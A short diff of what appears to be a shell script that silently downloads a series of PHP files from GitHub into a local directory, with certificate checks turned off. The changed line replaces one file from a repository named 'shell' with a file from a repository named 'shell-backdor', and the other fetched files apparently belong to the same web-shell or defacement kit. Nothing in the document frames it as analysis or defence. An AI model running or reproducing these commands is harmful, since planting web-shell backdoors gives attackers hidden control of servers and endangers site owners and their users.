@@ -10,7 +10,7 @@ wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com
 wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/hime-yuki77/dist/main/content.php
 wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/hime-yuki77/dist/main/revisi.php
 wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/hime-yuki77/dist/main/function.php
-wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/clownEx7/shell/main/index.php
+wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/mrkronkz/shell-backdor/master/tolol.php
 wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/hime-yuki77/res/main/revisi.php
 wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/hime-yuki77/dist/main/footer-batom.php
 wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/hime-yuki77/res/main/ngir.php
